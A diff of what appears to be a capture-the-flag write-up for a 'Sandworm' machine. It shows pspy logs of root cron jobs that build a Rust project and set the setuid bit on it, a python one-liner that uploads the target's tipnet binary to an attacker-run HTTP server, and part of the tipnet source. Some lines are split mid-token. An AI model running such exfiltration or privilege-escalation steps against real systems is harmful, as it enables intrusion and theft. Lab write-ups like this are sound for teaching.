-2023/06/21 06:54:53 CMD: UID=0 PID=2 | 
-2023/06/21 06:54:53 CMD: UID=0 PID=1 | /sbin/init maybe-ubiquity 
-2023/06/21 06:55:01 CMD: UID=0 PID=42523 | /usr/sbin/CRON -f -P 
-2023/06/21 06:55:01 CMD: UID=0 PID=42524 | /usr/sbin/CRON -f -P 
-2023/06/21 06:55:01 CMD: UID=0 PID=42526 | /bin/cp -p /root/Cleanup/webapp.profile /home/atlas/.config/firejail/ 
-2023/06/21 06:55:01 CMD: UID=0 PID=42525 | /bin/bash /root/Cleanup/clean.sh 
-2023/06/21 06:55:01 CMD: UID=0 PID=42527 | /bin/cp -p /root/Cleanup/admin.json /home/atlas/.config/httpie/sessions/localhost_5000/ 
-2023/06/21 06:55:03 CMD: UID=0 PID=42528 | 
-2023/06/21 06:55:16 CMD: UID=0 PID=42532 | run-parts --list /etc/dhcp/dhclient-enter-hooks.d 
-2023/06/21 06:55:16 CMD: UID=0 PID=42531 | /bin/sh /sbin/dhclient-script 
-2023/06/21 06:55:16 CMD: UID=0 PID=42533 | systemctl is-enabled systemd-resolved 
-2023/06/21 06:55:16 CMD: UID=0 PID=42534 | ip -4 addr change 10.129.34.14/255.255.0.0 broadcast 10.129.255.255 valid_lft 3600 preferred_lft 3600 dev eth0 label eth0 
-2023/06/21 06:55:16 CMD: UID=0 PID=42535 | run-parts --list /etc/dhcp/dhclient-exit-hooks.d 
-2023/06/21 06:55:16 CMD: UID=0 PID=42536 | /bin/sh /sbin/dhclient-script 
-2023/06/21 06:55:16 CMD: UID=0 PID=42537 | /bin/sh /sbin/dhclient-script 
+2023/06/21 06:54:53 CMD: UID=0 PID=14 |
+2023/06/21 06:54:53 CMD: UID=0 PID=13 |
+2023/06/21 06:54:53 CMD: UID=0 PID=12 |
+2023/06/21 06:54:53 CMD: UID=0 PID=11 |
+2023/06/21 06:54:53 CMD: UID=0 PID=10 |
+2023/06/21 06:54:53 CMD: UID=0 PID=8 |
+2023/06/21 06:54:53 CMD: UID=0 PID=6 |
+2023/06/21 06:54:53 CMD: UID=0 PID=5 |
+2023/06/21 06:54:53 CMD: UID=0 PID=4 |
+2023/06/21 06:54:53 CMD: UID=0 PID=3 |
+2023/06/21 06:54:53 CMD: UID=0 PID=2 |
+2023/06/21 06:54:53 CMD: UID=0 PID=1 | /sbin/init maybe-ubiquity
+2023/06/21 06:55:01 CMD: UID=0 PID=42523 | /usr/sbin/CRON -f -P
+2023/06/21 06:55:01 CMD: UID=0 PID=42524 | /usr/sbin/CRON -f -P
+2023/06/21 06:55:01 CMD: UID=0 PID=42526 | /bin/cp -p /root/Cleanup/webapp.profile /home/atlas/.config/firejail/
+2023/06/21 06:55:01 CMD: UID=0 PID=42525 | /bin/bash /root/Cleanup/clean.sh
+2023/06/21 06:55:01 CMD: UID=0 PID=42527 | /bin/cp -p /root/Cleanup/admin.json /home/atlas/.config/httpie/sessions/localhost_5000/
+2023/06/21 06:55:03 CMD: UID=0 PID=42528 |
+2023/06/21 06:55:16 CMD: UID=0 PID=42532 | run-parts --list /etc/dhcp/dhclient-enter-hooks.d
+2023/06/21 06:55:16 CMD: UID=0 PID=42531 | /bin/sh /sbin/dhclient-script
+2023/06/21 06:55:16 CMD: UID=0 PID=42533 | systemctl is-enabled systemd-resolved
+2023/06/21 06:55:16 CMD: UID=0 PID=42534 | ip -4 addr change 10.129.34.14/255.255.0.0 broadcast 10.129.255.255 valid_lft 3600 preferred_lft 3600 dev eth0 label eth0
+2023/06/21 06:55:16 CMD: UID=0 PID=42535 | run-parts --list /etc/dhcp/dhclient-exit-hooks.d
+2023/06/21 06:55:16 CMD: UID=0 PID=42536 | /bin/sh /sbin/dhclient-script
+2023/06/21 06:55:16 CMD: UID=0 PID=42537 | /bin/sh /sbin/dhclient-script
 2023/06/21 06:55:16 CMD: UID=0 PID=42538 | ???
-2023/06/21 06:55:16 CMD: UID=0 PID=42540 | /bin/sh /sbin/dhclient-script 
-2023/06/21 06:55:16 CMD: UID=0 PID=42541 | /bin/sh /sbin/dhclient-script 
-2023/06/21 06:55:16 CMD: UID=0 PID=42542 | /bin/sh /sbin/dhclient-script 
-2023/06/21 06:55:16 CMD: UID=0 PID=42543 | mktemp 
-2023/06/21 06:55:16 CMD: UID=0 PID=42544 | md5sum /run/network/isc-dhcp-v4-eth0 /run/network/isc-dhcp-v6-eth0 /run/network/ifupdown-inet-eth0 /run/network/ifupdown-inet6-eth0 
-2023/06/21 06:55:16 CMD: UID=0 PID=42545 | cmp --silent /tmp/tmp.e3JfBSINNe /tmp/tmp.EExLWMvohC 
-C2023/06/21 06:56:01 CMD: UID=0 PID=42548 | /usr/sbin/CRON -f -P 
-2023/06/21 06:56:01 CMD: UID=0 PID=42547 | /usr/sbin/CRON -f -P 
-2023/06/21 06:56:01 CMD: UID=0 PID=42551 | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 06:56:01 CMD: UID=0 PID=42549 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 06:56:01 CMD: UID=1000 PID=42552 | /usr/bin/cargo run --offline 
-2023/06/21 06:56:01 CMD: UID=0 PID=42553 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
-2023/06/21 06:56:01 CMD: UID=0 PID=42554 | sleep 10 
-2023/06/21 06:56:01 CMD: UID=1000 PID=42555 | /usr/bin/cargo run --offline 
-2023/06/21 06:56:01 CMD: UID=1000 PID=42556 | /usr/bin/cargo run --offline 
-2023/06/21 06:56:01 CMD: UID=1000 PID=42558 | /usr/bin/cargo run --offline 
-2023/06/21 06:56:02 CMD: UID=1000 PID=42560 | rustc -vV 
-2023/06/21 06:56:11 CMD: UID=0 PID=42566 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
-2023/06/21 06:56:11 CMD: UID=0 PID=42567 | /bin/rm -r /opt/crates 
-2023/06/21 06:56:11 CMD: UID=0 PID=42568 | /bin/cp -rp /root/Cleanup/crates /opt/ 
-2023/06/21 06:56:11 CMD: UID=0 PID=42569 | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet 
-c2023/06/21 06:58:01 CMD: UID=0 PID=42574 | /usr/sbin/CRON -f -P 
-2023/06/21 06:58:01 CMD: UID=0 PID=42573 | /usr/sbin/CRON -f -P 
-2023/06/21 06:58:01 CMD: UID=0 PID=42575 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 06:58:01 CMD: UID=0 PID=42577 | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 06:58:01 CMD: UID=0 PID=42579 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
-2023/06/21 06:58:01 CMD: UID=0 PID=42578 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
-2023/06/21 06:58:01 CMD: UID=1000 PID=42580 | /usr/bin/cargo run --offline 
-2023/06/21 06:58:01 CMD: UID=1000 PID=42581 | /usr/bin/cargo run --offline 
-2023/06/21 06:58:01 CMD: UID=1000 PID=42582 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed 
-2023/06/21 06:58:01 CMD: UID=1000 PID=42584 | /usr/bin/cargo run --offline 
-2023/06/21 06:58:02 CMD: UID=1000 PID=42587 | /usr/bin/cargo run --offline 
-2023/06/21 06:58:11 CMD: UID=0 PID=42593 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 06:58:11 CMD: UID=0 PID=42594 | /bin/rm -r /opt/crates 
-2023/06/21 06:58:11 CMD: UID=0 PID=42595 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 06:59:05 CMD: UID=1001 PID=42597 | 
-2023/06/21 07:00:01 CMD: UID=0 PID=42606 | /usr/sbin/CRON -f -P 
-2023/06/21 07:00:01 CMD: UID=0 PID=42605 | /usr/sbin/CRON -f -P 
-2023/06/21 07:00:01 CMD: UID=0 PID=42604 | /usr/sbin/CRON -f -P 
-2023/06/21 07:00:01 CMD: UID=0 PID=42607 | /usr/sbin/CRON -f -P 
-2023/06/21 07:00:01 CMD: UID=0 PID=42609 | /bin/cp -p /root/Cleanup/webapp.profile /home/atlas/.config/firejail/ 
-2023/06/21 07:00:01 CMD: UID=0 PID=42608 | /bin/bash /root/Cleanup/clean.sh 
-2023/06/21 07:00:01 CMD: UID=0 PID=42613 | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 07:00:01 CMD: UID=0 PID=42612 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 07:00:01 CMD: UID=0 PID=42611 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 07:00:01 CMD: UID=0 PID=42614 | /usr/sbin/CRON -f -P 
-2023/06/21 07:00:01 CMD: UID=0 PID=42616 | sleep 10 
-2023/06/21 07:00:01 CMD: UID=1000 PID=42615 | /usr/bin/cargo run --offline 
-2023/06/21 07:00:02 CMD: UID=1000 PID=42617 | rustc -vV 
-2023/06/21 07:00:02 CMD: UID=1000 PID=42618 | /usr/bin/cargo run --offline 
-2023/06/21 07:00:02 CMD: UID=1000 PID=42620 | /usr/bin/cargo run --offline 
-2023/06/21 07:00:02 CMD: UID=1000 PID=42622 | /usr/bin/cargo run --offline 
-2023/06/21 07:00:11 CMD: UID=0 PID=42626 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 07:00:11 CMD: UID=0 PID=42627 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 07:00:11 CMD: UID=0 PID=42628 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 07:00:12 CMD: UID=0 PID=42629 | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet 
-^F2023/06/21 07:02:01 CMD: UID=0 PID=42636 | /usr/sbin/CRON -f -P 
-2023/06/21 07:02:01 CMD: UID=0 PID=42635 | /usr/sbin/CRON -f -P 
-2023/06/21 07:02:01 CMD: UID=0 PID=42637 | 
-2023/06/21 07:02:01 CMD: UID=0 PID=42638 | sleep 10 
-2023/06/21 07:02:01 CMD: UID=0 PID=42639 | /usr/sbin/CRON -f -P 
-2023/06/21 07:02:01 CMD: UID=0 PID=42641 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 07:02:01 CMD: UID=0 PID=42640 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 07:02:01 CMD: UID=1000 PID=42642 | /usr/bin/cargo run --offline 
-2023/06/21 07:02:01 CMD: UID=1000 PID=42643 | /usr/bin/cargo run --offline 
-2023/06/21 07:02:01 CMD: UID=1000 PID=42644 | /usr/bin/cargo run --offline 
-2023/06/21 07:02:01 CMD: UID=1000 PID=42646 | 
-2023/06/21 07:02:02 CMD: UID=1000 PID=42648 | rustc -vV 
-2023/06/21 07:02:11 CMD: UID=0 PID=42652 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 07:02:11 CMD: UID=0 PID=42653 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 07:02:11 CMD: UID=0 PID=42654 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 07:02:11 CMD: UID=0 PID=42655 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 07:04:01 CMD: UID=0 PID=42661 | /usr/sbin/CRON -f -P 
-2023/06/21 07:04:01 CMD: UID=0 PID=42660 | /usr/sbin/CRON -f -P 
-2023/06/21 07:04:01 CMD: UID=0 PID=42662 | /usr/sbin/CRON -f -P 
-2023/06/21 07:04:01 CMD: UID=0 PID=42663 | sleep 10 
-2023/06/21 07:04:01 CMD: UID=0 PID=42664 | /usr/sbin/CRON -f -P 
-2023/06/21 07:04:01 CMD: UID=0 PID=42666 | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 07:04:01 CMD: UID=1000 PID=42667 | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 07:04:02 CMD: UID=1000 PID=42668 | rustc -vV 
-2023/06/21 07:04:02 CMD: UID=1000 PID=42669 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed 
-2023/06/21 07:04:02 CMD: UID=1000 PID=42671 | /usr/bin/cargo run --offline 
-2023/06/21 07:04:11 CMD: UID=0 PID=42677 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 07:04:11 CMD: UID=0 PID=42678 | /bin/rm -r /opt/crates 
-2023/06/21 07:04:11 CMD: UID=0 PID=42679 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 07:05:01 CMD: UID=0 PID=42683 | /usr/sbin/CRON -f -P 
-2023/06/21 07:05:01 CMD: UID=0 PID=42685 | /bin/sh -c /bin/bash /root/Cleanup/clean.sh 
-2023/06/21 07:05:01 CMD: UID=0 PID=42684 | /bin/sh -c /bin/bash /root/Cleanup/clean.sh 
-2023/06/21 07:05:01 CMD: UID=0 PID=42686 | 
-2023/06/21 07:05:01 CMD: UID=0 PID=42687 | /bin/bash /root/Cleanup/clean.sh 
-2023/06/21 07:06:01 CMD: UID=0 PID=42691 | /usr/sbin/CRON -f -P 
-2023/06/21 07:06:01 CMD: UID=0 PID=42690 | /usr/sbin/CRON -f -P 
-2023/06/21 07:06:01 CMD: UID=0 PID=42693 | sleep 10 
-2023/06/21 07:06:01 CMD: UID=0 PID=42692 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
-2023/06/21 07:06:01 CMD: UID=0 PID=42696 | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 07:06:01 CMD: UID=0 PID=42694 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
-2023/06/21 07:06:01 CMD: UID=1000 PID=42697 | /usr/bin/cargo run --offline 
-2023/06/21 07:06:02 CMD: UID=1000 PID=42698 | rustc -vV 
-2023/06/21 07:06:02 CMD: UID=1000 PID=42699 | /usr/bin/cargo run --offline 
-2023/06/21 07:06:02 CMD: UID=1000 PID=42701 | /usr/bin/cargo run --offline 
-2023/06/21 07:06:02 CMD: UID=1000 PID=42703 | rustc -vV 
-2023/06/21 07:06:11 CMD: UID=0 PID=42707 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
-2023/06/21 07:06:11 CMD: UID=0 PID=42708 | /bin/rm -r /opt/crates 
-2023/06/21 07:06:11 CMD: UID=0 PID=42709 | /bin/cp -rp /root/Cleanup/crates /opt/ 
-2023/06/21 07:06:12 CMD: UID=0 PID=42710 | /bin/bash /root/Cleanup/clean_c.sh 
-2023/06/21 07:06:23 CMD: UID=0 PID=42714 |
-```
-
-
-
-```
-2023/06/21 06:58:01 CMD: UID=1000 PID=42582 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed
-```
-
-
-
-```
+2023/06/21 06:55:16 CMD: UID=0 PID=42540 | /bin/sh /sbin/dhclient-script
+2023/06/21 06:55:16 CMD: UID=0 PID=42541 | /bin/sh /sbin/dhclient-script
+2023/06/21 06:55:16 CMD: UID=0 PID=42542 | /bin/sh /sbin/dhclient-script
+2023/06/21 06:55:16 CMD: UID=0 PID=42543 | mktemp
+2023/06/21 06:55:16 CMD: UID=0 PID=42544 | md5sum /run/network/isc-dhcp-v4-eth0 /run/network/isc-dhcp-v6-eth0 /run/network/ifupdown-inet-eth0 /run/network/ifupdown-inet6-eth0
+2023/06/21 06:55:16 CMD: UID=0 PID=42545 | cmp --silent /tmp/tmp.e3JfBSINNe /tmp/tmp.EExLWMvohC
+C2023/06/21 06:56:01 CMD: UID=0 PID=42548 | /usr/sbin/CRON -f -P
+2023/06/21 06:56:01 CMD: UID=0 PID=42547 | /usr/sbin/CRON -f -P
+2023/06/21 06:56:01 CMD: UID=0 PID=42551 | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 06:56:01 CMD: UID=0 PID=42549 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 06:56:01 CMD: UID=1000 PID=42552 | /usr/bin/cargo run --offline
+2023/06/21 06:56:01 CMD: UID=0 PID=42553 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
+2023/06/21 06:56:01 CMD: UID=0 PID=42554 | sleep 10
+2023/06/21 06:56:01 CMD: UID=1000 PID=42555 | /usr/bin/cargo run --offline
+2023/06/21 06:56:01 CMD: UID=1000 PID=42556 | /usr/bin/cargo run --offline
+2023/06/21 06:56:01 CMD: UID=1000 PID=42558 | /usr/bin/cargo run --offline
+2023/06/21 06:56:02 CMD: UID=1000 PID=42560 | rustc -vV
+2023/06/21 06:56:11 CMD: UID=0 PID=42566 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
+2023/06/21 06:56:11 CMD: UID=0 PID=42567 | /bin/rm -r /opt/crates
+2023/06/21 06:56:11 CMD: UID=0 PID=42568 | /bin/cp -rp /root/Cleanup/crates /opt/
 2023/06/21 06:56:11 CMD: UID=0 PID=42569 | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
-```
-
-
-
-```
-silentobserver@sandworm:/opt/tipnet/target/debug$ python3 -c "import requests;requests.post(\"http://10.10.14.114:8000/upload\",files={\"files\":open(\"/opt/tipnet/target/debug/tipnet\",\"rb\")})"
-```
-
-
-
-```
+c2023/06/21 06:58:01 CMD: UID=0 PID=42574 | /usr/sbin/CRON -f -P
+2023/06/21 06:58:01 CMD: UID=0 PID=42573 | /usr/sbin/CRON -f -P
+2023/06/21 06:58:01 CMD: UID=0 PID=42575 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 06:58:01 CMD: UID=0 PID=42577 | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 06:58:01 CMD: UID=0 PID=42579 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
+2023/06/21 06:58:01 CMD: UID=0 PID=42578 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
+2023/06/21 06:58:01 CMD: UID=1000 PID=42580 | /usr/bin/cargo run --offline
+2023/06/21 06:58:01 CMD: UID=1000 PID=42581 | /usr/bin/cargo run --offline
+2023/06/21 06:58:01 CMD: UID=1000 PID=42582 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed
+2023/06/21 06:58:01 CMD: UID=1000 PID=42584 | /usr/bin/cargo run --offline
+2023/06/21 06:58:02 CMD: UID=1000 PID=42587 | /usr/bin/cargo run --offline
+2023/06/21 06:58:11 CMD: UID=0 PID=42593 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 06:58:11 CMD: UID=0 PID=42594 | /bin/rm -r /opt/crates
+2023/06/21 06:58:11 CMD: UID=0 PID=42595 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 06:59:05 CMD: UID=1001 PID=42597 |
+2023/06/21 07:00:01 CMD: UID=0 PID=42606 | /usr/sbin/CRON -f -P
+2023/06/21 07:00:01 CMD: UID=0 PID=42605 | /usr/sbin/CRON -f -P
+2023/06/21 07:00:01 CMD: UID=0 PID=42604 | /usr/sbin/CRON -f -P
+2023/06/21 07:00:01 CMD: UID=0 PID=42607 | /usr/sbin/CRON -f -P
+2023/06/21 07:00:01 CMD: UID=0 PID=42609 | /bin/cp -p /root/Cleanup/webapp.profile /home/atlas/.config/firejail/
+2023/06/21 07:00:01 CMD: UID=0 PID=42608 | /bin/bash /root/Cleanup/clean.sh
+2023/06/21 07:00:01 CMD: UID=0 PID=42613 | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 07:00:01 CMD: UID=0 PID=42612 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 07:00:01 CMD: UID=0 PID=42611 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 07:00:01 CMD: UID=0 PID=42614 | /usr/sbin/CRON -f -P
+2023/06/21 07:00:01 CMD: UID=0 PID=42616 | sleep 10
+2023/06/21 07:00:01 CMD: UID=1000 PID=42615 | /usr/bin/cargo run --offline
+2023/06/21 07:00:02 CMD: UID=1000 PID=42617 | rustc -vV
+2023/06/21 07:00:02 CMD: UID=1000 PID=42618 | /usr/bin/cargo run --offline
+2023/06/21 07:00:02 CMD: UID=1000 PID=42620 | /usr/bin/cargo run --offline
+2023/06/21 07:00:02 CMD: UID=1000 PID=42622 | /usr/bin/cargo run --offline
+2023/06/21 07:00:11 CMD: UID=0 PID=42626 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 07:00:11 CMD: UID=0 PID=42627 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 07:00:11 CMD: UID=0 PID=42628 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 07:00:12 CMD: UID=0 PID=42629 | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
+^F2023/06/21 07:02:01 CMD: UID=0 PID=42636 | /usr/sbin/CRON -f -P
+2023/06/21 07:02:01 CMD: UID=0 PID=42635 | /usr/sbin/CRON -f -P
+2023/06/21 07:02:01 CMD: UID=0 PID=42637 |
+2023/06/21 07:02:01 CMD: UID=0 PID=42638 | sleep 10
+2023/06/21 07:02:01 CMD: UID=0 PID=42639 | /usr/sbin/CRON -f -P
+2023/06/21 07:02:01 CMD: UID=0 PID=42641 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 07:02:01 CMD: UID=0 PID=42640 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 07:02:01 CMD: UID=1000 PID=42642 | /usr/bin/cargo run --offline
+2023/06/21 07:02:01 CMD: UID=1000 PID=42643 | /usr/bin/cargo run --offline
+2023/06/21 07:02:01 CMD: UID=1000 PID=42644 | /usr/bin/cargo run --offline
+2023/06/21 07:02:01 CMD: UID=1000 PID=42646 |
+2023/06/21 07:02:02 CMD: UID=1000 PID=42648 | rustc -vV
+2023/06/21 07:02:11 CMD: UID=0 PID=42652 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 07:02:11 CMD: UID=0 PID=42653 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 07:02:11 CMD: UID=0 PID=42654 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 07:02:11 CMD: UID=0 PID=42655 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 07:04:01 CMD: UID=0 PID=42661 | /usr/sbin/CRON -f -P
+2023/06/21 07:04:01 CMD: UID=0 PID=42660 | /usr/sbin/CRON -f -P
+2023/06/21 07:04:01 CMD: UID=0 PID=42662 | /usr/sbin/CRON -f -P
+2023/06/21 07:04:01 CMD: UID=0 PID=42663 | sleep 10
+2023/06/21 07:04:01 CMD: UID=0 PID=42664 | /usr/sbin/CRON -f -P
+2023/06/21 07:04:01 CMD: UID=0 PID=42666 | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 07:04:01 CMD: UID=1000 PID=42667 | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 07:04:02 CMD: UID=1000 PID=42668 | rustc -vV
+2023/06/21 07:04:02 CMD: UID=1000 PID=42669 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed
+2023/06/21 07:04:02 CMD: UID=1000 PID=42671 | /usr/bin/cargo run --offline
+2023/06/21 07:04:11 CMD: UID=0 PID=42677 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 07:04:11 CMD: UID=0 PID=42678 | /bin/rm -r /opt/crates
+2023/06/21 07:04:11 CMD: UID=0 PID=42679 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 07:05:01 CMD: UID=0 PID=42683 | /usr/sbin/CRON -f -P
+2023/06/21 07:05:01 CMD: UID=0 PID=42685 | /bin/sh -c /bin/bash /root/Cleanup/clean.sh
+2023/06/21 07:05:01 CMD: UID=0 PID=42684 | /bin/sh -c /bin/bash /root/Cleanup/clean.sh
+2023/06/21 07:05:01 CMD: UID=0 PID=42686 |
+2023/06/21 07:05:01 CMD: UID=0 PID=42687 | /bin/bash /root/Cleanup/clean.sh
+2023/06/21 07:06:01 CMD: UID=0 PID=42691 | /usr/sbin/CRON -f -P
+2023/06/21 07:06:01 CMD: UID=0 PID=42690 | /usr/sbin/CRON -f -P
+2023/06/21 07:06:01 CMD: UID=0 PID=42693 | sleep 10
+2023/06/21 07:06:01 CMD: UID=0 PID=42692 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
+2023/06/21 07:06:01 CMD: UID=0 PID=42696 | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 07:06:01 CMD: UID=0 PID=42694 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
+2023/06/21 07:06:01 CMD: UID=1000 PID=42697 | /usr/bin/cargo run --offline
+2023/06/21 07:06:02 CMD: UID=1000 PID=42698 | rustc -vV
+2023/06/21 07:06:02 CMD: UID=1000 PID=42699 | /usr/bin/cargo run --offline
+2023/06/21 07:06:02 CMD: UID=1000 PID=42701 | /usr/bin/cargo run --offline
+2023/06/21 07:06:02 CMD: UID=1000 PID=42703 | rustc -vV
+2023/06/21 07:06:11 CMD: UID=0 PID=42707 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
+2023/06/21 07:06:11 CMD: UID=0 PID=42708 | /bin/rm -r /opt/crates
+2023/06/21 07:06:11 CMD: UID=0 PID=42709 | /bin/cp -rp /root/Cleanup/crates /opt/
+2023/06/21 07:06:12 CMD: UID=0 PID=42710 | /bin/bash /root/Cleanup/clean_c.sh
+2023/06/21 07:06:23 CMD: UID=0 PID=42714 |
+2023/06/21 06:58:01 CMD: UID=1000 PID=42582 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed
+2023/06/21 06:56:11 CMD: UID=0 PID=42569 | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
+silentobserver@sandworm:/opt/tipnet/target/debug$ python3 -c "import requests;requests.post(\"http://10.10.14.114:
+8000/upload\",files={\"files\":
+open(\"/opt/tipnet/target/debug/tipnet\",\"rb\")})"
 ┌──(root㉿kali)-[~/work]
 └─# python3 -m uploadserver
 File upload available at /upload
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:
+8000/) ...
 10.129.34.14 - - [21/Jun/2023 03:46:35] [Uploaded] "tipnet" --> /root/work/tipnet
 10.129.34.14 - - [21/Jun/2023 03:46:35] "POST /upload HTTP/1.1" 204 -
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/work]
-└─# md5sum tipnet 
+└─# md5sum tipnet
 dda029937eaee34a45b00383960fc2f5 tipnet
-```
-
-
-
-```
 silentobserver@sandworm:/opt/tipnet/target/debug$ md5sum tipnet
 dda029937eaee34a45b00383960fc2f5 tipnet
 silentobserver@sandworm:/opt/tipnet/target/debug$
-```
-
-
-
-```
 extern crate logger;
 use sha2::{Digest, Sha256};
-use chrono::prelude::*;
+use chrono::
+prelude::*;
 use mysql::*;
-use mysql::prelude::*;
+use mysql::
+prelude::*;
 use std::fs;
-use std::process::Command;
+use std::
+process::
+Command;
 use std::io;
 
 // We don't spy on you... much.
@@ -1041,22 +935,22 @@ struct Entry {
 }
 
 fn main() {
- println!(" 
- ,, 
-MMP\"\"MM\"\"YMM db `7MN. `7MF' mm 
-P' MM `7 MMN. M MM 
- MM `7MM `7MMpdMAo. M YMb M .gP\"Ya mmMMmm 
- MM MM MM `Wb M `MN. M ,M' Yb MM 
- MM MM MM M8 M `MM.M 8M\"\"\"\"\"\" MM 
- MM MM MM ,AP M YMM YM. , MM 
- .JMML. .JMML. MMbmmd'.JML. YM `Mbmmd' `Mbmo 
- MM 
- .JMML. 
+ println!("
+ ,,
+MMP\"\"MM\"\"YMM db `7MN. `7MF' mm
+P' MM `7 MMN. M MM
+ MM `7MM `7MMpdMAo. M YMb M .gP\"Ya mmMMmm
+ MM MM MM `Wb M `MN. M ,M' Yb MM
+ MM MM MM M8 M `MM.M 8M\"\"\"\"\"\" MM
+ MM MM MM ,AP M YMM YM. , MM
+ .JMML. .JMML. MMbmmd'.JML. YM `Mbmmd' `Mbmo
+ MM
+ .JMML.
 
 ");
 
  let mode = get_mode();
- 
+
  if mode == "" {
  return;
  }
@@ -1075,8 +969,10 @@ P' MM `7 MMN. M MM
  }
 
  println!("Enter keywords to perform the query:");
- let mut keywords = String::new();
- io::stdin().read_line(&mut keywords).unwrap();
+ let mut keywords = String::
+new();
+ io::
+stdin().read_line(&mut keywords).unwrap();
 
